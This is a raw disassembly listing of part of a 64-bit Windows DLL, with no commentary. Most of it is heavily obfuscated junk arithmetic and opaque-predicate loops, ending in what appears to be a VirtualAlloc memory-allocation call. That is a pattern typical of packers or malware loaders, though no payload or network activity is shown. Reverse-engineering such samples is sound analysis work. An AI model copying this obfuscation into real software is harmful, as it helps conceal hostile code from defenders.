   180001e00:	74 66                	je     0x180001e68
   180001e02:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001e08:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180001e0c:	83 c0 0b             	add    $0xb,%eax
   180001e0f:	99                   	cltd
   180001e10:	f7 f9                	idiv   %ecx
   180001e12:	eb 35                	jmp    0x180001e49
   180001e14:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001e1a:	03 c3                	add    %ebx,%eax
   180001e1c:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001e22:	41 8b c0             	mov    %r8d,%eax
   180001e25:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001e2b:	f7 e9                	imul   %ecx
   180001e2d:	d1 fa                	sar    $1,%edx
   180001e2f:	8b c2                	mov    %edx,%eax
   180001e31:	c1 e8 1f             	shr    $0x1f,%eax
   180001e34:	03 d0                	add    %eax,%edx
   180001e36:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001e39:	3b c8                	cmp    %eax,%ecx
   180001e3b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001e41:	74 04                	je     0x180001e47
   180001e43:	03 c3                	add    %ebx,%eax
   180001e45:	eb 02                	jmp    0x180001e49
   180001e47:	2b c3                	sub    %ebx,%eax
   180001e49:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001e4f:	41 8b c4             	mov    %r12d,%eax
   180001e52:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001e58:	f7 e9                	imul   %ecx
   180001e5a:	8b c2                	mov    %edx,%eax
   180001e5c:	c1 e8 1f             	shr    $0x1f,%eax
   180001e5f:	03 d0                	add    %eax,%edx
   180001e61:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001e64:	3b c8                	cmp    %eax,%ecx
   180001e66:	74 ac                	je     0x180001e14
   180001e68:	8b 05 96 31 02 00    	mov    0x23196(%rip),%eax        # 0x180025004
   180001e6e:	89 44 24 24          	mov    %eax,0x24(%rsp)
   180001e72:	44 89 8d 80 01 00 00 	mov    %r9d,0x180(%rbp)
   180001e79:	44 89 8d 88 01 00 00 	mov    %r9d,0x188(%rbp)
   180001e80:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180001e86:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001e8c:	03 c8                	add    %eax,%ecx
   180001e8e:	41 8b c4             	mov    %r12d,%eax
   180001e91:	f7 e9                	imul   %ecx
   180001e93:	8b c2                	mov    %edx,%eax
   180001e95:	c1 e8 1f             	shr    $0x1f,%eax
   180001e98:	03 d0                	add    %eax,%edx
   180001e9a:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001e9d:	3b c8                	cmp    %eax,%ecx
   180001e9f:	74 4b                	je     0x180001eec
   180001ea1:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001ea7:	41 03 cf             	add    %r15d,%ecx
   180001eaa:	41 03 cd             	add    %r13d,%ecx
   180001ead:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001eb3:	eb 1c                	jmp    0x180001ed1
   180001eb5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001ebb:	03 c3                	add    %ebx,%eax
   180001ebd:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001ec3:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001ec9:	03 c3                	add    %ebx,%eax
   180001ecb:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001ed1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001ed7:	41 23 c3             	and    %r11d,%eax
   180001eda:	7d 07                	jge    0x180001ee3
   180001edc:	2b c3                	sub    %ebx,%eax
   180001ede:	41 0b c6             	or     %r14d,%eax
   180001ee1:	03 c3                	add    %ebx,%eax
   180001ee3:	85 c0                	test   %eax,%eax
   180001ee5:	74 ce                	je     0x180001eb5
   180001ee7:	e9 5c 01 00 00       	jmp    0x180002048
   180001eec:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001ef2:	41 23 c2             	and    %r10d,%eax
   180001ef5:	7d 07                	jge    0x180001efe
   180001ef7:	2b c3                	sub    %ebx,%eax
   180001ef9:	83 c8 fe             	or     $0xfffffffe,%eax
   180001efc:	03 c3                	add    %ebx,%eax
   180001efe:	85 c0                	test   %eax,%eax
   180001f00:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001f06:	74 4a                	je     0x180001f52
   180001f08:	41 8b cf             	mov    %r15d,%ecx
   180001f0b:	41 2b cd             	sub    %r13d,%ecx
   180001f0e:	03 c8                	add    %eax,%ecx
   180001f10:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001f16:	eb 1c                	jmp    0x180001f34
   180001f18:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001f1e:	03 c3                	add    %ebx,%eax
   180001f20:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001f26:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001f2c:	03 c3                	add    %ebx,%eax
   180001f2e:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001f34:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001f3a:	41 8b c4             	mov    %r12d,%eax
   180001f3d:	f7 e9                	imul   %ecx
   180001f3f:	8b c2                	mov    %edx,%eax
   180001f41:	c1 e8 1f             	shr    $0x1f,%eax
   180001f44:	03 d0                	add    %eax,%edx
   180001f46:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180001f49:	3b c8                	cmp    %eax,%ecx
   180001f4b:	74 cb                	je     0x180001f18
   180001f4d:	e9 f6 00 00 00       	jmp    0x180002048
   180001f52:	41 23 c3             	and    %r11d,%eax
   180001f55:	7d 07                	jge    0x180001f5e
   180001f57:	2b c3                	sub    %ebx,%eax
   180001f59:	41 0b c6             	or     %r14d,%eax
   180001f5c:	03 c3                	add    %ebx,%eax
   180001f5e:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001f64:	85 c0                	test   %eax,%eax
   180001f66:	74 65                	je     0x180001fcd
   180001f68:	41 03 cf             	add    %r15d,%ecx
   180001f6b:	41 8d 45 03          	lea    0x3(%r13),%eax
   180001f6f:	0f af c8             	imul   %eax,%ecx
   180001f72:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180001f78:	eb 3b                	jmp    0x180001fb5
   180001f7a:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001f80:	03 c3                	add    %ebx,%eax
   180001f82:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180001f88:	41 8b c0             	mov    %r8d,%eax
   180001f8b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180001f91:	f7 e9                	imul   %ecx
   180001f93:	d1 fa                	sar    $1,%edx
   180001f95:	8b c2                	mov    %edx,%eax
   180001f97:	c1 e8 1f             	shr    $0x1f,%eax
   180001f9a:	03 d0                	add    %eax,%edx
   180001f9c:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001f9f:	3b c8                	cmp    %eax,%ecx
   180001fa1:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001fa7:	74 04                	je     0x180001fad
   180001fa9:	2b c3                	sub    %ebx,%eax
   180001fab:	eb 02                	jmp    0x180001faf
   180001fad:	03 c3                	add    %ebx,%eax
   180001faf:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180001fb5:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001fbb:	41 23 c2             	and    %r10d,%eax
   180001fbe:	7d 07                	jge    0x180001fc7
   180001fc0:	2b c3                	sub    %ebx,%eax
   180001fc2:	83 c8 fe             	or     $0xfffffffe,%eax
   180001fc5:	03 c3                	add    %ebx,%eax
   180001fc7:	85 c0                	test   %eax,%eax
   180001fc9:	74 af                	je     0x180001f7a
   180001fcb:	eb 7b                	jmp    0x180002048
   180001fcd:	41 8b c0             	mov    %r8d,%eax
   180001fd0:	f7 e9                	imul   %ecx
   180001fd2:	d1 fa                	sar    $1,%edx
   180001fd4:	8b c2                	mov    %edx,%eax
   180001fd6:	c1 e8 1f             	shr    $0x1f,%eax
   180001fd9:	03 d0                	add    %eax,%edx
   180001fdb:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180001fde:	3b c8                	cmp    %eax,%ecx
   180001fe0:	74 66                	je     0x180002048
   180001fe2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180001fe8:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   180001fec:	83 c0 0b             	add    $0xb,%eax
   180001fef:	99                   	cltd
   180001ff0:	f7 f9                	idiv   %ecx
   180001ff2:	eb 35                	jmp    0x180002029
   180001ff4:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180001ffa:	03 c3                	add    %ebx,%eax
   180001ffc:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002002:	41 8b c0             	mov    %r8d,%eax
   180002005:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000200b:	f7 e9                	imul   %ecx
   18000200d:	d1 fa                	sar    $1,%edx
   18000200f:	8b c2                	mov    %edx,%eax
   180002011:	c1 e8 1f             	shr    $0x1f,%eax
   180002014:	03 d0                	add    %eax,%edx
   180002016:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   180002019:	3b c8                	cmp    %eax,%ecx
   18000201b:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002021:	74 04                	je     0x180002027
   180002023:	03 c3                	add    %ebx,%eax
   180002025:	eb 02                	jmp    0x180002029
   180002027:	2b c3                	sub    %ebx,%eax
   180002029:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000202f:	41 8b c4             	mov    %r12d,%eax
   180002032:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002038:	f7 e9                	imul   %ecx
   18000203a:	8b c2                	mov    %edx,%eax
   18000203c:	c1 e8 1f             	shr    $0x1f,%eax
   18000203f:	03 d0                	add    %eax,%edx
   180002041:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002044:	3b c8                	cmp    %eax,%ecx
   180002046:	74 ac                	je     0x180001ff4
   180002048:	4c 8b 35 c9 6f 02 00 	mov    0x26fc9(%rip),%r14        # 0x180029018
   18000204f:	44 89 8d 80 01 00 00 	mov    %r9d,0x180(%rbp)
   180002056:	44 89 8d 88 01 00 00 	mov    %r9d,0x188(%rbp)
   18000205d:	8b 8d 88 01 00 00    	mov    0x188(%rbp),%ecx
   180002063:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002069:	03 c8                	add    %eax,%ecx
   18000206b:	41 8b c4             	mov    %r12d,%eax
   18000206e:	f7 e9                	imul   %ecx
   180002070:	8b c2                	mov    %edx,%eax
   180002072:	c1 e8 1f             	shr    $0x1f,%eax
   180002075:	03 d0                	add    %eax,%edx
   180002077:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000207a:	3b c8                	cmp    %eax,%ecx
   18000207c:	74 4b                	je     0x1800020c9
   18000207e:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002084:	41 03 cf             	add    %r15d,%ecx
   180002087:	41 03 ce             	add    %r14d,%ecx
   18000208a:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002090:	eb 1c                	jmp    0x1800020ae
   180002092:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002098:	03 c3                	add    %ebx,%eax
   18000209a:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800020a0:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800020a6:	03 c3                	add    %ebx,%eax
   1800020a8:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800020ae:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800020b4:	41 23 c3             	and    %r11d,%eax
   1800020b7:	7d 07                	jge    0x1800020c0
   1800020b9:	2b c3                	sub    %ebx,%eax
   1800020bb:	83 c8 fc             	or     $0xfffffffc,%eax
   1800020be:	03 c3                	add    %ebx,%eax
   1800020c0:	85 c0                	test   %eax,%eax
   1800020c2:	74 ce                	je     0x180002092
   1800020c4:	e9 5c 01 00 00       	jmp    0x180002225
   1800020c9:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800020cf:	41 23 c2             	and    %r10d,%eax
   1800020d2:	7d 07                	jge    0x1800020db
   1800020d4:	2b c3                	sub    %ebx,%eax
   1800020d6:	83 c8 fe             	or     $0xfffffffe,%eax
   1800020d9:	03 c3                	add    %ebx,%eax
   1800020db:	85 c0                	test   %eax,%eax
   1800020dd:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800020e3:	74 4a                	je     0x18000212f
   1800020e5:	41 8b cf             	mov    %r15d,%ecx
   1800020e8:	41 2b ce             	sub    %r14d,%ecx
   1800020eb:	03 c8                	add    %eax,%ecx
   1800020ed:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800020f3:	eb 1c                	jmp    0x180002111
   1800020f5:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800020fb:	03 c3                	add    %ebx,%eax
   1800020fd:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002103:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002109:	03 c3                	add    %ebx,%eax
   18000210b:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002111:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002117:	41 8b c4             	mov    %r12d,%eax
   18000211a:	f7 e9                	imul   %ecx
   18000211c:	8b c2                	mov    %edx,%eax
   18000211e:	c1 e8 1f             	shr    $0x1f,%eax
   180002121:	03 d0                	add    %eax,%edx
   180002123:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002126:	3b c8                	cmp    %eax,%ecx
   180002128:	74 cb                	je     0x1800020f5
   18000212a:	e9 f6 00 00 00       	jmp    0x180002225
   18000212f:	41 23 c3             	and    %r11d,%eax
   180002132:	7d 07                	jge    0x18000213b
   180002134:	2b c3                	sub    %ebx,%eax
   180002136:	83 c8 fc             	or     $0xfffffffc,%eax
   180002139:	03 c3                	add    %ebx,%eax
   18000213b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002141:	85 c0                	test   %eax,%eax
   180002143:	74 65                	je     0x1800021aa
   180002145:	41 03 cf             	add    %r15d,%ecx
   180002148:	41 8d 46 03          	lea    0x3(%r14),%eax
   18000214c:	0f af c8             	imul   %eax,%ecx
   18000214f:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002155:	eb 3b                	jmp    0x180002192
   180002157:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000215d:	03 c3                	add    %ebx,%eax
   18000215f:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002165:	41 8b c0             	mov    %r8d,%eax
   180002168:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000216e:	f7 e9                	imul   %ecx
   180002170:	d1 fa                	sar    $1,%edx
   180002172:	8b c2                	mov    %edx,%eax
   180002174:	c1 e8 1f             	shr    $0x1f,%eax
   180002177:	03 d0                	add    %eax,%edx
   180002179:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000217c:	3b c8                	cmp    %eax,%ecx
   18000217e:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002184:	74 04                	je     0x18000218a
   180002186:	2b c3                	sub    %ebx,%eax
   180002188:	eb 02                	jmp    0x18000218c
   18000218a:	03 c3                	add    %ebx,%eax
   18000218c:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002192:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002198:	41 23 c2             	and    %r10d,%eax
   18000219b:	7d 07                	jge    0x1800021a4
   18000219d:	2b c3                	sub    %ebx,%eax
   18000219f:	83 c8 fe             	or     $0xfffffffe,%eax
   1800021a2:	03 c3                	add    %ebx,%eax
   1800021a4:	85 c0                	test   %eax,%eax
   1800021a6:	74 af                	je     0x180002157
   1800021a8:	eb 7b                	jmp    0x180002225
   1800021aa:	41 8b c0             	mov    %r8d,%eax
   1800021ad:	f7 e9                	imul   %ecx
   1800021af:	d1 fa                	sar    $1,%edx
   1800021b1:	8b c2                	mov    %edx,%eax
   1800021b3:	c1 e8 1f             	shr    $0x1f,%eax
   1800021b6:	03 d0                	add    %eax,%edx
   1800021b8:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800021bb:	3b c8                	cmp    %eax,%ecx
   1800021bd:	74 66                	je     0x180002225
   1800021bf:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800021c5:	41 8d 4e 17          	lea    0x17(%r14),%ecx
   1800021c9:	83 c0 0b             	add    $0xb,%eax
   1800021cc:	99                   	cltd
   1800021cd:	f7 f9                	idiv   %ecx
   1800021cf:	eb 35                	jmp    0x180002206
   1800021d1:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800021d7:	03 c3                	add    %ebx,%eax
   1800021d9:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800021df:	41 8b c0             	mov    %r8d,%eax
   1800021e2:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800021e8:	f7 e9                	imul   %ecx
   1800021ea:	d1 fa                	sar    $1,%edx
   1800021ec:	8b c2                	mov    %edx,%eax
   1800021ee:	c1 e8 1f             	shr    $0x1f,%eax
   1800021f1:	03 d0                	add    %eax,%edx
   1800021f3:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800021f6:	3b c8                	cmp    %eax,%ecx
   1800021f8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800021fe:	74 04                	je     0x180002204
   180002200:	03 c3                	add    %ebx,%eax
   180002202:	eb 02                	jmp    0x180002206
   180002204:	2b c3                	sub    %ebx,%eax
   180002206:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000220c:	41 8b c4             	mov    %r12d,%eax
   18000220f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002215:	f7 e9                	imul   %ecx
   180002217:	8b c2                	mov    %edx,%eax
   180002219:	c1 e8 1f             	shr    $0x1f,%eax
   18000221c:	03 d0                	add    %eax,%edx
   18000221e:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002221:	3b c8                	cmp    %eax,%ecx
   180002223:	74 ac                	je     0x1800021d1
   180002225:	8b 44 24 24          	mov    0x24(%rsp),%eax
   180002229:	33 d2                	xor    %edx,%edx
   18000222b:	f7 35 df 6d 02 00    	divl   0x26ddf(%rip)        # 0x180029010
   180002231:	44 89 8d 80 01 00 00 	mov    %r9d,0x180(%rbp)
   180002238:	44 89 8d 88 01 00 00 	mov    %r9d,0x188(%rbp)
   18000223f:	44 8b e0             	mov    %eax,%r12d
   180002242:	44 8b 85 88 01 00 00 	mov    0x188(%rbp),%r8d
   180002249:	41 b9 56 55 55 55    	mov    $0x55555556,%r9d
   18000224f:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002255:	41 8b c1             	mov    %r9d,%eax
   180002258:	44 03 c1             	add    %ecx,%r8d
   18000225b:	41 f7 e8             	imul   %r8d
   18000225e:	8b ca                	mov    %edx,%ecx
   180002260:	c1 e9 1f             	shr    $0x1f,%ecx
   180002263:	03 d1                	add    %ecx,%edx
   180002265:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002268:	44 3b c0             	cmp    %eax,%r8d
   18000226b:	74 4b                	je     0x1800022b8
   18000226d:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002273:	41 03 cf             	add    %r15d,%ecx
   180002276:	41 03 cd             	add    %r13d,%ecx
   180002279:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000227f:	eb 1c                	jmp    0x18000229d
   180002281:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002287:	03 c3                	add    %ebx,%eax
   180002289:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000228f:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   180002295:	03 c3                	add    %ebx,%eax
   180002297:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   18000229d:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800022a3:	41 23 c3             	and    %r11d,%eax
   1800022a6:	7d 07                	jge    0x1800022af
   1800022a8:	2b c3                	sub    %ebx,%eax
   1800022aa:	83 c8 fc             	or     $0xfffffffc,%eax
   1800022ad:	03 c3                	add    %ebx,%eax
   1800022af:	85 c0                	test   %eax,%eax
   1800022b1:	74 ce                	je     0x180002281
   1800022b3:	e9 67 01 00 00       	jmp    0x18000241f
   1800022b8:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800022be:	41 23 c2             	and    %r10d,%eax
   1800022c1:	7d 07                	jge    0x1800022ca
   1800022c3:	2b c3                	sub    %ebx,%eax
   1800022c5:	83 c8 fe             	or     $0xfffffffe,%eax
   1800022c8:	03 c3                	add    %ebx,%eax
   1800022ca:	85 c0                	test   %eax,%eax
   1800022cc:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800022d2:	74 4a                	je     0x18000231e
   1800022d4:	41 8b cf             	mov    %r15d,%ecx
   1800022d7:	41 2b cd             	sub    %r13d,%ecx
   1800022da:	03 c8                	add    %eax,%ecx
   1800022dc:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   1800022e2:	eb 1c                	jmp    0x180002300
   1800022e4:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800022ea:	03 c3                	add    %ebx,%eax
   1800022ec:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800022f2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800022f8:	03 c3                	add    %ebx,%eax
   1800022fa:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002300:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002306:	41 8b c1             	mov    %r9d,%eax
   180002309:	f7 e9                	imul   %ecx
   18000230b:	8b c2                	mov    %edx,%eax
   18000230d:	c1 e8 1f             	shr    $0x1f,%eax
   180002310:	03 d0                	add    %eax,%edx
   180002312:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002315:	3b c8                	cmp    %eax,%ecx
   180002317:	74 cb                	je     0x1800022e4
   180002319:	e9 01 01 00 00       	jmp    0x18000241f
   18000231e:	41 23 c3             	and    %r11d,%eax
   180002321:	7d 07                	jge    0x18000232a
   180002323:	2b c3                	sub    %ebx,%eax
   180002325:	83 c8 fc             	or     $0xfffffffc,%eax
   180002328:	03 c3                	add    %ebx,%eax
   18000232a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002330:	85 c0                	test   %eax,%eax
   180002332:	74 6a                	je     0x18000239e
   180002334:	41 03 cf             	add    %r15d,%ecx
   180002337:	41 8d 45 03          	lea    0x3(%r13),%eax
   18000233b:	0f af c8             	imul   %eax,%ecx
   18000233e:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   180002344:	eb 3d                	jmp    0x180002383
   180002346:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   18000234c:	03 c3                	add    %ebx,%eax
   18000234e:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002354:	b8 67 66 66 66       	mov    $0x66666667,%eax
   180002359:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000235f:	f7 e9                	imul   %ecx
   180002361:	d1 fa                	sar    $1,%edx
   180002363:	8b c2                	mov    %edx,%eax
   180002365:	c1 e8 1f             	shr    $0x1f,%eax
   180002368:	03 d0                	add    %eax,%edx
   18000236a:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   18000236d:	3b c8                	cmp    %eax,%ecx
   18000236f:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002375:	74 04                	je     0x18000237b
   180002377:	2b c3                	sub    %ebx,%eax
   180002379:	eb 02                	jmp    0x18000237d
   18000237b:	03 c3                	add    %ebx,%eax
   18000237d:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002383:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002389:	41 23 c2             	and    %r10d,%eax
   18000238c:	7d 07                	jge    0x180002395
   18000238e:	2b c3                	sub    %ebx,%eax
   180002390:	83 c8 fe             	or     $0xfffffffe,%eax
   180002393:	03 c3                	add    %ebx,%eax
   180002395:	85 c0                	test   %eax,%eax
   180002397:	74 ad                	je     0x180002346
   180002399:	e9 81 00 00 00       	jmp    0x18000241f
   18000239e:	41 b8 67 66 66 66    	mov    $0x66666667,%r8d
   1800023a4:	41 8b c0             	mov    %r8d,%eax
   1800023a7:	f7 e9                	imul   %ecx
   1800023a9:	d1 fa                	sar    $1,%edx
   1800023ab:	8b c2                	mov    %edx,%eax
   1800023ad:	c1 e8 1f             	shr    $0x1f,%eax
   1800023b0:	03 d0                	add    %eax,%edx
   1800023b2:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800023b5:	3b c8                	cmp    %eax,%ecx
   1800023b7:	74 66                	je     0x18000241f
   1800023b9:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800023bf:	41 8d 4d 17          	lea    0x17(%r13),%ecx
   1800023c3:	83 c0 0b             	add    $0xb,%eax
   1800023c6:	99                   	cltd
   1800023c7:	f7 f9                	idiv   %ecx
   1800023c9:	eb 35                	jmp    0x180002400
   1800023cb:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800023d1:	03 c3                	add    %ebx,%eax
   1800023d3:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800023d9:	41 8b c0             	mov    %r8d,%eax
   1800023dc:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   1800023e2:	f7 e9                	imul   %ecx
   1800023e4:	d1 fa                	sar    $1,%edx
   1800023e6:	8b c2                	mov    %edx,%eax
   1800023e8:	c1 e8 1f             	shr    $0x1f,%eax
   1800023eb:	03 d0                	add    %eax,%edx
   1800023ed:	8d 04 92             	lea    (%rdx,%rdx,4),%eax
   1800023f0:	3b c8                	cmp    %eax,%ecx
   1800023f2:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800023f8:	74 04                	je     0x1800023fe
   1800023fa:	03 c3                	add    %ebx,%eax
   1800023fc:	eb 02                	jmp    0x180002400
   1800023fe:	2b c3                	sub    %ebx,%eax
   180002400:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   180002406:	41 8b c1             	mov    %r9d,%eax
   180002409:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   18000240f:	f7 e9                	imul   %ecx
   180002411:	8b c2                	mov    %edx,%eax
   180002413:	c1 e8 1f             	shr    $0x1f,%eax
   180002416:	03 d0                	add    %eax,%edx
   180002418:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   18000241b:	3b c8                	cmp    %eax,%ecx
   18000241d:	74 ac                	je     0x1800023cb
   18000241f:	8b 15 df 2b 02 00    	mov    0x22bdf(%rip),%edx        # 0x180025004
   180002425:	33 c9                	xor    %ecx,%ecx
   180002427:	41 b8 00 30 00 00    	mov    $0x3000,%r8d
   18000242d:	44 8d 49 04          	lea    0x4(%rcx),%r9d
   180002431:	ff 15 11 6c 02 00    	call   *0x26c11(%rip)        # 0x180029048
   180002437:	4c 8b d0             	mov    %rax,%r10
   18000243a:	41 b9 56 55 55 55    	mov    $0x55555556,%r9d
   180002440:	b8 e9 f4 2c 00       	mov    $0x2cf4e9,%eax
   180002445:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   18000244b:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   180002451:	41 8b c1             	mov    %r9d,%eax
   180002454:	44 8b 85 88 01 00 00 	mov    0x188(%rbp),%r8d
   18000245b:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002461:	44 03 c1             	add    %ecx,%r8d
   180002464:	41 f7 e8             	imul   %r8d
   180002467:	8b ca                	mov    %edx,%ecx
   180002469:	c1 e9 1f             	shr    $0x1f,%ecx
   18000246c:	03 d1                	add    %ecx,%edx
   18000246e:	8d 04 52             	lea    (%rdx,%rdx,2),%eax
   180002471:	44 3b c0             	cmp    %eax,%r8d
   180002474:	0f 84 a2 00 00 00    	je     0x18000251c
   18000247a:	8b 8d 80 01 00 00    	mov    0x180(%rbp),%ecx
   180002480:	41 03 cf             	add    %r15d,%ecx
   180002483:	41 03 cd             	add    %r13d,%ecx
   180002486:	89 8d 80 01 00 00    	mov    %ecx,0x180(%rbp)
   18000248c:	b9 03 00 00 80       	mov    $0x80000003,%ecx
   180002491:	eb 1c                	jmp    0x1800024af
   180002493:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   180002499:	03 c3                	add    %ebx,%eax
   18000249b:	89 85 80 01 00 00    	mov    %eax,0x180(%rbp)
   1800024a1:	8b 85 88 01 00 00    	mov    0x188(%rbp),%eax
   1800024a7:	03 c3                	add    %ebx,%eax
   1800024a9:	89 85 88 01 00 00    	mov    %eax,0x188(%rbp)
   1800024af:	8b 85 80 01 00 00    	mov    0x180(%rbp),%eax
   1800024b5:	23 c1                	and    %ecx,%eax
   1800024b7:	7d 07                	jge    0x1800024c0
   1800024b9:	2b c3                	sub    %ebx,%eax
   1800024bb:	83 c8 fc             	or     $0xfffffffc,%eax
   1800024be:	03 c3                	add    %ebx,%eax
   1800024c0:	85 c0                	test   %eax,%eax
   1800024c2:	74 cf                	je     0x180002493
